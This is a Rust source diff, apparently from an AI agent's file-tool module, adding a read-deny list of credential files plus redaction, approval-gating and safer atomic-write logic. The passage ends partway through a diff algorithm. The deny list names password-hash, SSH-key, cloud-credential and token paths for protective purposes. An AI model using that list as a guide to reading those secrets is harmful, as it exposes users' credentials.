@@ -13,10 +13,10 @@
 //! - [`file_tool_specs`]：给 LLM 的工具声明（`nx_read` 等）。**尚未接进 act.rs**，
 //!   接线清单见文件末尾 `接线说明`。
 //!
-//! 脱敏约定：本模块**不改写**读到的内容，只在结果里给出 `sensitive` 标记
-//! （命中禁写清单的路径，或 `redact::redact` 会改动的内容）。把内容喂给 LLM /
-//! 展示到审批卡片之前是否脱敏、怎么脱敏，由调用方决定 —— 同一份内容在
-//! 「写回文件」与「给模型看」两条路上的要求不同，混在这里只会改坏文件。
+//! 脱敏约定：写入路径**不改写**内容（写回文件的必须是原文）。读出路径（`read` / `grep`）
+//! 给模型看的文本在这里就先对整份原文过 `redact::redact_lines`（行数不变）再编行号 / 取行 ——
+//! 行号前缀加在脱敏之前会让 PEM 正文躲过扫描。禁读清单（[`DEFAULT_READ_DENY`]）里的路径
+//! 不批准不读（[`FileError::ReadDenied`]），grep 遍历时跳过。
 //!
 //! 接线说明（给之后把它接进 act.rs 的人）：
 //! 1. `tool_specs()` 里拼上 [`file_tool_specs`]，按 `TOOL_READ` 等常量分派；
@@ -25,7 +25,8 @@
 //!    失败时把错误原样回给模型，让它退回 `nx_exec`。
 //! 3. 写 / 改走两段式：[`FileOps::prepare_write`] / [`FileOps::prepare_edit`] 拿到
 //!    [`PendingChange`] → 用其中 `change.diff_preview` 出审批卡片 → 批准后
-//!    [`FileOps::commit`]（会复核 before_hash，审批期间文件被改动就拒绝）。
+//!    [`FileOps::commit`]（会复核 before_hash，审批期间文件被改动就拒绝；过大的文件也流式算哈希）。
+//!    **[`PendingChange::preview_complete`] 为 false 时任何档位都必须先出审批卡**（`files_tool` 已照办）。
 //! 4. `allow_sensitive` 只能在用户明确批准后由调用方置位，**不要**开放成模型参数。
 //! 5. 结果 `sensitive == true` 时，喂给 LLM / 写入审计前先过 `redact::redact`。
 //! 6. 审批卡片 / 审计里展示 `FileChange::atomic`：false 表示远端不支持
@@ -59,8 +60,11 @@ pub const DEFAULT_WRITE_CAP: usize = 1024 * 1024;
 pub const DEFAULT_READ_LINES: usize = 2000;
 /// 单行展示上限（字符）。压缩过的 JS / 单行 JSON 不截断会一行吃掉整个上下文。
 pub const MAX_LINE_CHARS: usize = 2000;
-/// 差异预览最多多少行。预览只用于审批卡片，不是完整补丁。
-const DIFF_PREVIEW_MAX_LINES: usize = 80;
+/// 差异预览最多多少行（含文件头与区块头）。超过即截断，并标记「预览不完整」——
+/// 审批卡上看不全的修改不能靠自动档位静默落盘，见 [`PendingChange::preview_complete`]。
+pub const DIFF_PREVIEW_MAX_LINES: usize = 2000;
+/// 预览不完整时 diff 文本的第一行以它开头（前端据此出横幅，见 `src/lib/diff.ts`）
+pub const DIFF_INCOMPLETE_MARK: &str = "⚠ 预览不完整";
 /// 差异的上下文行数（同 `diff -u`）
 const DIFF_CONTEXT: usize = 3;
 /// 判断二进制只看开头这么多字节（与 git 的启发式相同）
@@ -88,6 +92,31 @@ pub const DEFAULT_DENY: &[&str] = &[
     "/dev/",
 ];
 
+/// 默认「禁读」清单：读出来就等于泄漏凭据的路径。语法同 [`DEFAULT_DENY`]，另外允许最后一段带通配符。
+///
+/// 刻意比禁写清单窄：`/etc/passwd`、`/proc/`、`/etc/ssh/sshd_config` 这些排障时天天要看，
+/// 读它们不泄漏秘密；这里只收口令哈希、私钥、云凭据与各类登录令牌。
+/// 命中时 [`FileOps::read`] 不给内容，只给元数据并要求用户批准（经 `files_tool` 的审批卡）；
+/// grep 遍历时直接跳过。批准后读到的内容仍然要过 [`super::redact::redact_lines`]。
+pub const DEFAULT_READ_DENY: &[&str] = &[
+    "/etc/shadow",
+    "/etc/shadow-",
+    "/etc/gshadow",
+    "/etc/gshadow-",
+    "/etc/security/opasswd",
+    "/etc/ssh/ssh_host_*_key",
+    "/root/.ssh/",
+    "~/.ssh/",
+    "~/.gnupg/",
+    "~/.aws/credentials",
+    "~/.netrc",
+    "~/.pgpass",
+    "~/.git-credentials",
+    "~/.docker/config.json",
+    "~/.kube/config",
+    "~/.config/gh/hosts.yml",
+];
+
 /// 遍历时一律跳过的目录名：体量大、几乎从不是 Agent 要找的东西。
 pub const DEFAULT_SKIP_DIRS: &[&str] = &[".git", "node_modules"];
 
@@ -109,6 +138,9 @@ pub enum FileError {
     Binary(String),
     #[error("拒绝写入受保护路径「{0}」：需要用户明确授权")]
     Denied(String),
+    /// 禁读清单命中：只给元数据，内容要用户批准才能读（批准后仍脱敏）
+    #[error("「{path}」在受保护清单里（密钥 / 凭据，{size} 字节）：需要用户批准才能读取")]
+    ReadDenied { path: String, size: u64 },
     /// 编辑语义上的失败（没找到 / 不唯一 / 编码不对），内容已是完整提示
     #[error("{0}")]
     Edit(String),
@@ -171,6 +203,29 @@ pub trait FileTransport: Send + Sync {
     /// 创建或截断写入。**不要求原子**，原子性由 [`FileOps`] 用「临时文件 + 改名」拼出来
     async fn write(&self, path: &str, bytes: &[u8]) -> Result<(), FileError>;
     async fn set_mode(&self, path: &str, mode: u32) -> Result<(), FileError>;
+    /// **新建**文件（已存在则失败）并写入，`mode` 在创建那一刻就生效。
+    /// 原子写用它建临时文件：替换 0600 的秘密文件时，临时文件从诞生起就是 0600，
+    /// 不存在「先按 umask 建成 0644、再 chmod」的全世界可读窗口。
+    /// 默认实现退化成 write + set_mode（有窗口），能做到的 transport 应当覆盖它。
+    async fn create_with_mode(&self, path: &str, bytes: &[u8], mode: Option<u32>) -> Result<(), FileError> {
+        self.write(path, bytes).await?;
+        if let Some(m) = mode {
+            self.set_mode(path, m & 0o7777).await?;
+        }
+        Ok(())
+    }
+    /// 整个文件的 SHA-256。不受读上限约束（应流式计算）：过大、不生成差异的文件也要有 before_hash。
+    async fn sha256(&self, path: &str) -> Result<String, FileError> {
+        Ok(sha256_hex(&self.read(path, usize::MAX / 2).await?))
+    }
+    /// 硬链接数；协议给不出（SFTPv3）时返回 None
+    async fn link_count(&self, _path: &str) -> Option<u64> {
+        None
+    }
+    /// 把 `from` 的属主 / 属组抄到 `to` 上（以 root 运行时替换别人的文件要用）。做不到就报错，调用方只告警
+    async fn copy_owner(&self, _from: &str, _to: &str) -> Result<(), FileError> {
+        Ok(())
+    }
     /// 普通改名。目标已存在时允许失败（SFTPv3 就是这样）
     async fn rename(&self, from: &str, to: &str) -> Result<(), FileError>;
     /// 原子改名覆盖（目标存在也一步换掉）。不支持时返回 `Ok(false)` 且什么都不做，
@@ -316,6 +371,68 @@ impl FileTransport for LocalTransport {
         Ok(())
     }
 
+    async fn create_with_mode(&self, path: &str, bytes: &[u8], mode: Option<u32>) -> Result<(), FileError> {
+        use tokio::io::AsyncWriteExt;
+        let mut o = tokio::fs::OpenOptions::new();
+        // create_new：临时文件名虽是随机的，也不跟随别人预先放好的同名符号链接
+        o.write(true).create_new(true);
+        #[cfg(unix)]
+        if let Some(m) = mode {
+            // open(2) 的 mode 还要再与 umask 相与，只会更严，不会更松
+            o.mode(m & 0o7777);
+        }
+        #[cfg(not(unix))]
+        let _ = mode;
+        let mut f = o.open(path).await.map_err(|e| io_err(path, e))?;
+        f.write_all(bytes).await.map_err(|e| io_err(path, e))?;
+        f.sync_all().await.map_err(|e| io_err(path, e))?;
+        Ok(())
+    }
+
+    async fn sha256(&self, path: &str) -> Result<String, FileError> {
+        use tokio::io::AsyncReadExt;
+        let mut f = tokio::fs::File::open(path).await.map_err(|e| io_err(path, e))?;
+        let mut h = Sha256::new();
+        let mut buf = vec![0u8; 256 * 1024];
+        loop {
+            let n = f.read(&mut buf).await.map_err(|e| io_err(path, e))?;
+            if n == 0 {
+                break;
+            }
+            h.update(&buf[..n]);
+        }
+        Ok(h.finalize().iter().map(|b| format!("{b:02x}")).collect())
+    }
+
+    async fn link_count(&self, path: &str) -> Option<u64> {
+        #[cfg(unix)]
+        {
+            use std::os::unix::fs::MetadataExt;
+            tokio::fs::metadata(path).await.ok().map(|m| m.nlink())
+        }
+        #[cfg(not(unix))]
+        {
+            let _ = path;
+            None
+        }
+    }
+
+    async fn copy_owner(&self, from: &str, to: &str) -> Result<(), FileError> {
+        #[cfg(unix)]
+        {
+            use std::os::unix::fs::MetadataExt;
+            let src = tokio::fs::metadata(from).await.map_err(|e| io_err(from, e))?;
+            let dst = tokio::fs::metadata(to).await.map_err(|e| io_err(to, e))?;
+            if (src.uid(), src.gid()) != (dst.uid(), dst.gid()) {
+                // 非 root 改不了别人的属主，会 EPERM —— 由调用方告警，不算失败
+                std::os::unix::fs::chown(to, Some(src.uid()), Some(src.gid())).map_err(|e| io_err(to, e))?;
+            }
+        }
+        #[cfg(not(unix))]
+        let _ = (from, to);
+        Ok(())
+    }
+
     async fn rename(&self, from: &str, to: &str) -> Result<(), FileError> {
         tokio::fs::rename(from, to).await.map_err(|e| io_err(to, e))
     }
@@ -405,6 +522,18 @@ impl FileTransport for SftpTransport<'_> {
 
     async fn set_mode(&self, path: &str, mode: u32) -> Result<(), FileError> {
         self.mgr.set_permissions(&self.id, path, mode).await.map_err(sftp_err)
+    }
+
+    async fn create_with_mode(&self, path: &str, bytes: &[u8], mode: Option<u32>) -> Result<(), FileError> {
+        // 权限随 OPEN 请求的属性一起下发（服务器仍会与它自己的 umask 相与，只会更严）
+        self.mgr
+            .create_new_with_mode(&self.id, path, bytes, mode.map(|m| m & 0o7777))
+            .await
+            .map_err(sftp_err)
+    }
+
+    async fn sha256(&self, path: &str) -> Result<String, FileError> {
+        self.mgr.sha256(&self.id, path).await.map_err(sftp_err)
     }
 
     async fn rename(&self, from: &str, to: &str) -> Result<(), FileError> {
@@ -610,6 +739,18 @@ fn has_glob_meta(s: &str) -> bool {
     s.contains(['*', '?', '[', '{'])
 }
 
+/// 一条（已展开 `~` 的）清单规则是否命中路径 `c`
+fn rule_hits(expanded: &str, dir_rule: bool, c: &str) -> bool {
+    let base = normalize(expanded);
+    if dir_rule {
+        c == base || c.starts_with(&format!("{}/", base.trim_end_matches('/')))
+    } else if has_glob_meta(&base) {
+        glob_to_regex(&base).map(|re| re.is_match(c)).unwrap_or(false)
+    } else {
+        c == base
+    }
+}
+
 // ——————————————————————————————— 配置与结果 ———————————————————————————————
 
 /// 遍历上限：远端每列一个目录就是一次往返，必须有硬上限。
@@ -640,6 +781,8 @@ pub struct FileOpsConfig {
     pub write_cap: usize,
     /// 禁写清单，语法见 [`DEFAULT_DENY`]
     pub deny: Vec<String>,
+    /// 禁读清单（不批准不给内容），语法见 [`DEFAULT_READ_DENY`]
+    pub read_deny: Vec<String>,
     pub walk: WalkLimits,
     /// grep 最多扫描多少个文件 / 多少字节
     pub grep_max_files: usize,
@@ -652,6 +795,7 @@ impl Default for FileOpsConfig {
             read_cap: DEFAULT_READ_CAP,
             write_cap: DEFAULT_WRITE_CAP,
             deny: DEFAULT_DENY.iter().map(|s| s.to_string()).collect(),
+            read_deny: DEFAULT_READ_DENY.iter().map(|s| s.to_string()).collect(),
             walk: WalkLimits::default(),
             grep_max_files: 2_000,
             grep_max_bytes: 32 * 1024 * 1024,
@@ -663,7 +807,9 @@ impl Default for FileOpsConfig {
 #[serde(rename_all = "camelCase")]
 pub struct ReadResult {
     pub path: String,
-    /// `cat -n` 风格：行号右对齐 6 位 + Tab + 原文
+    /// `cat -n` 风格：行号右对齐 6 位 + Tab + 内容。
+    /// **已脱敏**：先对整份原文过 [`super::redact::redact_lines`]（行数不变）再编行号，
+    /// 所以行号仍与真实文件一致，而 PEM 正文之类不会因为行号前缀躲过脱敏
     pub content: String,
     /// 首行行号（1 起）
     pub start_line: usize,
@@ -673,9 +819,9 @@ pub struct ReadResult {
     pub truncated: bool,
     /// 有非法 UTF-8，已按替换字符解码（此时不要拿它当 edit 的原文）
     pub lossy: bool,
-    /// 可能含敏感信息，见模块文档「脱敏约定」
+    /// 路径在禁读清单里，或脱敏改动了内容
     pub sensitive: bool,
-    /// 整个文件的 SHA-256
+    /// 整个文件的 SHA-256（原文的）
     pub sha256: String,
 }
 
@@ -698,13 +844,24 @@ pub struct FileChange {
     /// 落盘是否原子：true = 新建文件，或一步改名覆盖（本地 rename / 远端 posix-rename）；
     /// false = 远端不支持 posix-rename、走了「备份 → 改名 → 删备份」，中间有极短窗口目标不存在。
     /// `prepare_*` 返回的预览里恒为 false，以 `commit` 返回的为准。
+    /// 目标有多个硬链接时也是 false：为了不把它从其它链接上拆开，改为原地截断重写。
     pub atomic: bool,
+    /// `diff_preview` 是否展示了**全部**修改。false = 差异超过 [`DIFF_PREVIEW_MAX_LINES`]、
+    /// 原文件过大或是二进制 —— 审批卡上看不到全部内容，见 [`PendingChange::preview_complete`]
+    pub preview_complete: bool,
 }
 
 /// 已算好、尚未落盘的修改。审批通过后交给 [`FileOps::commit`]。
 #[derive(Debug, Clone)]
 pub struct PendingChange {
     pub change: FileChange,
+    /// 预览是否完整（与 `change.preview_complete` 相同）。
+    ///
+    /// **调用方必须遵守**：为 false 时，人在卡片上看不到全部将要写入的内容（注入的载荷可以藏在
+    /// 第 3000 行），所以**无论什么档位（含自动 / 托管 Allow、Notify）都必须先出审批卡**，
+    /// 卡上写明「预览不完整」，批准后才能 [`FileOps::commit`]。`files_tool::run` 已经这样做；
+    /// 直接调 `FileOps` 的新调用方要自己照办。
+    pub preview_complete: bool,
     content: Vec<u8>,
     mode: Option<u32>,
     create_dirs: bool,
@@ -745,7 +902,10 @@ pub struct GrepResult {
     pub files_scanned: usize,
     /// 结果数、文件数、字节数或遍历任一上限被触发
     pub truncated: bool,
+    /// 有匹配行被脱敏改动过（匹配文本已是脱敏后的）
     pub sensitive: bool,
+    /// 因命中禁读清单而跳过、没有搜索的文件数
+    pub skipped_protected: usize,
 }
 
 impl GlobResult {
@@ -764,8 +924,16 @@ impl GlobResult {
 
 impl GrepResult {
     pub fn to_model_text(&self) -> String {
+        let skipped = if self.skipped_protected > 0 {
+            format!(
+                "（跳过了 {} 个受保护文件（密钥 / 凭据）：需要用户批准才能读取，确有必要请对单个文件用 nx_read）\n",
+                self.skipped_protected
+            )
+        } else {
+            String::new()
+        };
         if self.matches.is_empty() {
-            return format!("没有匹配（扫描了 {} 个文件）", self.files_scanned);
+            return format!("没有匹配（扫描了 {} 个文件）\n{skipped}", self.files_scanned);
         }
         let mut s: String = self
             .matches
@@ -775,6 +943,7 @@ impl GrepResult {
         if self.truncated {
             s.push_str("（结果已截断：缩小 path、加 glob 过滤或写更具体的正则）\n");
         }
+        s.push_str(&skipped);
         s
     }
 }
@@ -885,6 +1054,18 @@ impl<'a> FileOps<'a> {
 
     /// 路径是否命中禁写清单（字面路径与真实路径都查，防符号链接绕过）
     pub async fn is_denied(&self, path: &str) -> Result<bool, FileError> {
+        let c = self.candidates(path).await;
+        Ok(self.hits_any(&c, &self.cfg.deny).await)
+    }
+
+    /// 路径是否命中禁读清单（同样看穿符号链接）
+    pub async fn is_read_denied(&self, path: &str) -> Result<bool, FileError> {
+        let c = self.candidates(path).await;
+        Ok(self.hits_any(&c, &self.cfg.read_deny).await)
+    }
+
+    /// 字面路径 + 真实路径（文件不存在时取父目录的真实路径拼上文件名）
+    async fn candidates(&self, path: &str) -> Vec<String> {
         let mut candidates = vec![path.to_string()];
         if let Some(real) = self.t.realpath(path).await {
             candidates.push(normalize(&real));
@@ -894,10 +1075,14 @@ impl<'a> FileOps<'a> {
                 candidates.push(join(&normalize(&real), file_name(path)));
             }
         }
-        for rule in &self.cfg.deny {
-            let dir_rule = rule.ends_with('/');
+        candidates
+    }
+
+    /// 任一候选路径命中任一规则。规则以 `/` 结尾 = 目录前缀；含通配符 = glob（`*` 不跨 `/`）；否则精确匹配。
+    async fn hits_any(&self, candidates: &[String], rules: &[String]) -> bool {
+        for rule in rules {
             let expanded = if rule == "~" || rule.starts_with("~/") {
-                // 家目录拿不到就跳过 ~ 规则，不能因此把所有写入都拦掉
+                // 家目录拿不到就跳过 ~ 规则，不能因此把所有操作都拦掉
                 match self.home().await {
                     Ok(h) => format!("{h}{}", &rule[1..]),
                     Err(_) => continue,
@@ -905,19 +1090,11 @@ impl<'a> FileOps<'a> {
             } else {
                 rule.clone()
             };
-            let base = normalize(&expanded);
-            for c in &candidates {
-                let hit = if dir_rule {
-                    c == &base || c.starts_with(&format!("{}/", base.trim_end_matches('/')))
-                } else {
-                    c == &base
-                };
-                if hit {
-                    return Ok(true);
-                }
+            if candidates.iter().any(|c| rule_hits(&expanded, rule.ends_with('/'), c)) {
+                return true;
             }
         }
-        Ok(false)
+        false
     }
 
     async fn check_writable(&self, path: &str, allow_sensitive: bool) -> Result<(), FileError> {
@@ -930,16 +1107,33 @@ impl<'a> FileOps<'a> {
     // —— read ——
 
     /// 读文本文件，返回带行号的片段。`offset` 是 1 起的行号，`limit` 是行数。
+    /// 禁读清单里的路径报 [`FileError::ReadDenied`]（只含元数据），见 [`Self::read_with`]。
     pub async fn read(
         &self,
         path: &str,
         offset: Option<usize>,
         limit: Option<usize>,
     ) -> Result<ReadResult, FileError> {
+        self.read_with(path, offset, limit, false).await
+    }
+
+    /// 同 [`Self::read`]；`allow_sensitive` 越过禁读清单 —— 只能在用户批准了一张写明该路径的卡之后置位，
+    /// 且内容照样脱敏。
+    pub async fn read_with(
+        &self,
+        path: &str,
+        offset: Option<usize>,
+        limit: Option<usize>,
+        allow_sensitive: bool,
+    ) -> Result<ReadResult, FileError> {
         let path = self.resolve(path).await?;
         let st = self.t.stat(&path).await?.ok_or_else(|| FileError::NotFound(path.clone()))?;
         if st.is_dir {
             return Err(FileError::IsDirectory(path));
+        }
+        let denied = self.is_read_denied(&path).await?;
+        if denied && !allow_sensitive {
+            return Err(FileError::ReadDenied { path, size: st.size });
         }
         if st.size > self.cfg.read_cap as u64 {
             return Err(FileError::TooLarge { path, size: st.size, cap: self.cfg.read_cap });
@@ -953,6 +1147,10 @@ impl<'a> FileOps<'a> {
             Err(_) => (String::from_utf8_lossy(&bytes), true),
         };
 
+        // 先对整份原文脱敏（行数不变），再切片编行号：行号前缀不会让 PEM 正文躲过扫描，
+        // 截在私钥中间的 offset/limit 也不会让扫描器失去上下文
+        let redacted = super::redact::redact_lines(&text);
+        let sensitive = denied || redacted != *text;
         let total = text.lines().count();
         let start = offset.unwrap_or(1).max(1);
         let limit = limit.unwrap_or(DEFAULT_READ_LINES).max(1);
@@ -963,12 +1161,11 @@ impl<'a> FileOps<'a> {
         }
         let mut content = String::new();
         let mut n = 0;
-        for (i, line) in text.lines().enumerate().skip(start - 1).take(limit) {
+        for (i, line) in redacted.lines().enumerate().skip(start - 1).take(limit) {
             let line = line.strip_suffix('\r').unwrap_or(line);
             content.push_str(&format!("{:>6}\t{}\n", i + 1, truncate_chars(line, MAX_LINE_CHARS)));
             n += 1;
         }
-        let sensitive = self.is_denied(&path).await? || super::redact::redact(&text) != *text;
         Ok(ReadResult {
             sha256: sha256_hex(&bytes),
             path,
@@ -1020,24 +1217,42 @@ impl<'a> FileOps<'a> {
             }
         };
         let after = content.as_bytes();
-        let diff = match &before {
-            Some(b) if looks_binary(b) => "（原文件为二进制，不生成差异）".to_string(),
-            Some(b) => unified_diff(&path, &String::from_utf8_lossy(b), content),
-            None if st.is_some() => "（原文件过大，不生成差异）".to_string(),
-            None => unified_diff(&path, "", content),
+        let (diff, complete) = match &before {
+            Some(b) if looks_binary(b) => (
+                format!("{DIFF_INCOMPLETE_MARK}：原文件是二进制，看不到差异，将被整个替换为 {} 字节的新内容", after.len()),
+                false,
+            ),
+            Some(b) => diff_preview(&path, &String::from_utf8_lossy(b), content),
+            None if st.is_some() => (
+                format!(
+                    "{DIFF_INCOMPLETE_MARK}：原文件过大（{} 字节），不生成差异，将被整个替换为 {} 字节的新内容",
+                    st.as_ref().map_or(0, |s| s.size),
+                    after.len()
+                ),
+                false,
+            ),
+            None => diff_preview(&path, "", content),
+        };
+        // 过大没读的原文件也要有 before_hash（流式计算），否则 commit 的冲突复核会被跳过
+        let before_hash = match (&before, &st) {
+            (Some(b), _) => Some(sha256_hex(b)),
+            (None, Some(_)) => Some(self.t.sha256(&path).await?),
+            (None, None) => None,
         };
         Ok(PendingChange {
             change: FileChange {
                 created: st.is_none(),
-                before_hash: before.as_deref().map(sha256_hex),
+                before_hash,
                 after_hash: sha256_hex(after),
                 bytes: after.len(),
                 replacements: 0,
                 sensitive: super::redact::redact(&diff) != diff,
                 atomic: false,
+                preview_complete: complete,
                 diff_preview: diff,
                 path,
             },
+            preview_complete: complete,
             content: after.to_vec(),
             mode,
             create_dirs: opts.create_dirs,
@@ -1108,7 +1323,7 @@ impl<'a> FileOps<'a> {
                 cap: self.cfg.write_cap,
             });
         }
-        let diff = unified_diff(&path, text, &after);
+        let (diff, complete) = diff_preview(&path, text, &after);
         Ok(PendingChange {
             change: FileChange {
                 created: false,
@@ -1118,9 +1333,11 @@ impl<'a> FileOps<'a> {
                 replacements: if replace_all { count } else { 1 },
                 sensitive: super::redact::redact(&diff) != diff,
                 atomic: false,
+                preview_complete: complete,
                 diff_preview: diff,
                 path,
             },
+            preview_complete: complete,
             content: after.into_bytes(),
             mode: st.mode,
             create_dirs: false,
@@ -1140,8 +1357,12 @@ impl<'a> FileOps<'a> {
                     return Err(FileError::IsDirectory(path.clone()));
                 }
                 if let Some(expect) = &p.change.before_hash {
-                    let now = self.read_existing(path, s).await?;
-                    if now.as_deref().map(sha256_hex).as_ref() != Some(expect) {
+                    // 小文件整读，过大的流式算（与 prepare 时一致），保证每次都复核
+                    let now = match self.read_existing(path, s).await? {
+                        Some(b) => sha256_hex(&b),
+                        None => self.t.sha256(path).await?,
+                    };
+                    if &now != expect {
                         return Err(FileError::Conflict(path.clone()));
                     }
                 }
@@ -1216,7 +1437,12 @@ impl<'a> FileOps<'a> {
         Ok(())
     }
 
-    /// 原子替换：同目录写临时文件 → 还原权限 → 改名到位。返回是否原子（见 [`FileChange::atomic`]）。
+    /// 原子替换：同目录写临时文件（创建时即带原权限）→ 还原属主 → 改名到位。
+    /// 返回是否原子（见 [`FileChange::atomic`]）。
+    ///
+    /// 落到哪里：
+    /// - 目标是符号链接 → 解析成真实路径，替换**链接指向的文件**，链接本身保留；
+    /// - 目标有多个硬链接 → 改名会把它从其它链接上拆开，改为原地截断重写（不原子，返回 false）。
     ///
     /// 改名到位的顺序：
     /// 1. transport 支持原子覆盖（本地 rename、远端 `posix-rename@openssh.com`）→ 一步换掉；
@@ -1224,6 +1450,8 @@ impl<'a> FileOps<'a> {
     /// 3. 不支持且目标存在（SFTPv3 rename 不覆盖）→ 原文件改名成备份 → 临时文件改名到位 →
     ///    删备份。中间有极短窗口目标不存在；第二步失败会把备份改回去，
     ///    改不回去时错误里给出备份路径，绝不静默丢掉原文件。
+    ///
+    /// 已知不保留：ACL 与扩展属性（xattr）。
     async fn atomic_replace(
         &self,
         path: &str,
@@ -1231,20 +1459,43 @@ impl<'a> FileOps<'a> {
         mode: Option<u32>,
         exists: bool,
     ) -> Result<bool, FileError> {
+        // 符号链接：写到它指向的文件上（realpath 只在目标存在时才有意义）
+        let resolved = if exists {
+            self.t.realpath(path).await.map(|r| normalize(&r)).filter(|r| r != path)
+        } else {
+            None
+        };
+        let path = resolved.as_deref().unwrap_or(path);
+
+        if exists && self.t.link_count(path).await.is_some_and(|n| n > 1) {
+            // 硬链接：原地写，所有链接看到同一份新内容；权限 / 属主本来就没变
+            tracing::warn!(path, "目标有多个硬链接：改为原地重写（非原子）");
+            self.t.write(path, bytes).await?;
+            return Ok(false);
+        }
+
         let parent = parent_of(path)
             .ok_or_else(|| FileError::InvalidPath(format!("「{path}」没有父目录")))?;
         let name = file_name(path);
         let tag = &uuid::Uuid::new_v4().simple().to_string()[..8];
         let tmp = join(parent, &format!(".{name}.nxtmp-{tag}"));
 
-        if let Err(e) = self.t.write(&tmp, bytes).await {
+        // 临时文件从诞生起就是原文件的权限（0600 的秘密不会有一刻全世界可读）
+        if let Err(e) = self.t.create_with_mode(&tmp, bytes, mode.map(|m| m & 0o7777)).await {
             let _ = self.t.remove(&tmp).await;
             return Err(e);
         }
         if let Some(m) = mode {
-            // 权限还原失败不致命（比如文件属主不是自己），但脚本丢 +x 要让人知道
+            // 创建时的权限还要与 umask 相与，这里补齐成原样（比如 0755 在 umask 077 下）。
+            // 失败不致命（比如文件属主不是自己），但脚本丢 +x 要让人知道
             if let Err(e) = self.t.set_mode(&tmp, m & 0o7777).await {
                 tracing::warn!(path, error = %e, "原子写：还原权限失败");
+            }
+        }
+        if exists {
+            // 以 root 替换别人的文件时把属主 / 属组抄回去；非 root 做不到就告警
+            if let Err(e) = self.t.copy_owner(path, &tmp).await {
+                tracing::warn!(path, error = %e, "原子写：还原属主失败");
             }
         }
 
@@ -1403,6 +1654,9 @@ impl<'a> FileOps<'a> {
         };
         let root = self.resolve(path.unwrap_or("~")).await?;
         let st = self.t.stat(&root).await?.ok_or_else(|| FileError::NotFound(root.clone()))?;
+        if !st.is_dir && self.is_read_denied(&root).await? {
+            return Err(FileError::ReadDenied { path: root, size: st.size });
+        }
         let (files, mut truncated) = if st.is_dir {
             self.walk_files(&root, self.cfg.walk.max_depth).await?
         } else {
@@ -1419,7 +1673,8 @@ impl<'a> FileOps<'a> {
 
         let max = max_results.max(1);
         let mut matches = Vec::new();
-        let (mut scanned, mut bytes_scanned) = (0usize, 0u64);
+        let (mut scanned, mut bytes_scanned, mut skipped_protected) = (0usize, 0u64, 0usize);
+        let mut sensitive = false;
         'files: for (rel, e) in files {
             if let Some((r, by_path)) = &filter {
                 let subject = if *by_path { rel.as_str() } else { e.name.as_str() };
@@ -1428,6 +1683,12 @@ impl<'a> FileOps<'a> {
                 }
             }
             if e.size == 0 || e.size > self.cfg.read_cap as u64 {
+                continue;
+            }
+            // 遍历出来的每个文件只按字面路径查禁读清单（远端每个 realpath 都是一次往返）；
+            // 指向清单内文件的符号链接漏过这一步也不怕：输出照样逐行脱敏
+            if self.hits_any(std::slice::from_ref(&e.path), &self.cfg.read_deny).await {
+                skipped_protected += 1;
                 continue;
             }
             if scanned >= self.cfg.grep_max_files
@@ -1443,74 +1704,211 @@ impl<'a> FileOps<'a> {
                 continue;
             }
             let text = String::from_utf8_lossy(&bytes);
+            // 匹配用原文，展示用整份脱敏（行数不变）后的同一行：单独一行 PEM 正文看不出是私钥，
+            // 放在整个文件里扫描才认得出来
+            let mut redacted: Option<Vec<String>> = None;
             for (i, line) in text.lines().enumerate() {
                 if re.is_match(line) {
                     if matches.len() >= max {
                         truncated = true;
                         break 'files;
                     }
-                    let line = line.strip_suffix('\r').unwrap_or(line);
+                    let shown = redacted
+                        .get_or_insert_with(|| super::redact::redact_lines(&text).lines().map(str::to_string).collect())
+                        .get(i)
+                        .map(String::as_str)
+                        .unwrap_or(super::redact::PLACEHOLDER);
+                    if shown != line {
+                        sensitive = true;
+                    }
+                    let shown = shown.strip_suffix('\r').unwrap_or(shown);
                     matches.push(GrepMatch {
                         path: e.path.clone(),
                         line: i + 1,
-                        text: truncate_chars(line, GREP_LINE_CHARS),
+                        text: truncate_chars(shown, GREP_LINE_CHARS),
                     });
                 }
             }
         }
-        let sensitive = matches.iter().any(|m| super::redact::redact(&m.text) != m.text);
-        Ok(GrepResult { matches, files_scanned: scanned, truncated, sensitive })
+        Ok(GrepResult { matches, files_scanned: scanned, truncated, sensitive, skipped_protected })
     }
 }
 
 // ——————————————————————————————— 差异预览 ———————————————————————————————
 
-/// 极简 unified diff：掐掉公共前后缀，中间整段算一个 hunk。
-/// 对「改一处」的 edit 与小文件 write 足够清楚；多处分散修改会合成一个大 hunk，
-/// 超过 [`DIFF_PREVIEW_MAX_LINES`] 截断 —— 这是预览，不是补丁。
-pub fn unified_diff(path: &str, before: &str, after: &str) -> String {
+/// 一步编辑：`Eq(i, j)` = a[i] 与 b[j] 相同；`Del(i)` 删 a[i]；`Ins(j)` 插 b[j]。
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum DiffOp {
+    Eq(usize, usize),
+    Del(usize),
+    Ins(usize),
+}
+
+/// Myers 最短编辑脚本。编辑距离超过 `max_d` 时放弃（返回 None）：
+/// 那时差异行数必然超过预览上限，算出来也展示不完。内存 O(D²)，时间 O((N+M)·D)。
+fn myers(a: &[&str], b: &[&str], max_d: usize) -> Option<Vec<DiffOp>> {
+    let (n, m) = (a.len() as isize, b.len() as isize);
+    let lim = (a.len() + b.len()).min(max_d) as isize;
+    let off = lim + 1;
+    let mut v = vec![0isize; (2 * lim + 3) as usize];
+    // trace[d] = 第 d 轮开始前 v 在 k ∈ [-d, d] 上的快照，回溯用
+    let mut trace: Vec<Vec<isize>> = Vec::new();
+    let mut done = None;
+    'outer: for d in 0..=lim {
+        trace.push(v[(off - d) as usize..=(off + d) as usize].to_vec());
+        let mut k = -d;
+        while k <= d {
+            let mut x = if k == -d || (k != d && v[(off + k - 1) as usize] < v[(off + k + 1) as usize]) {
+                v[(off + k + 1) as usize]
+            } else {
+                v[(off + k - 1) as usize] + 1
+            };
+            let mut y = x - k;
+            while x < n && y < m && a[x as usize] == b[y as usize] {
+                x += 1;
+                y += 1;
+            }
+            v[(off + k) as usize] = x;
+            if x >= n && y >= m {
+                done = Some(d);
+                break 'outer;
+            }
+            k += 2;
+        }
+    }
+    let dmax = done?;
+    let mut ops = Vec::new();
+    let (mut x, mut y) = (n, m);
+    for d in (1..=dmax).rev() {
+        let vp = &trace[d as usize];
+        let at = |k: isize| vp[(k + d) as usize];
+        let k = x - y;
+        let prev_k = if k == -d || (k != d && at(k - 1) < at(k + 1)) { k + 1 } else { k - 1 };
+        let prev_x = at(prev_k);
+        let prev_y = prev_x - prev_k;
+        while x > prev_x && y > prev_y {
+            x -= 1;
+            y -= 1;
+            ops.push(DiffOp::Eq(x as usize, y as usize));
+        }
+        if x == prev_x {
+            y -= 1;
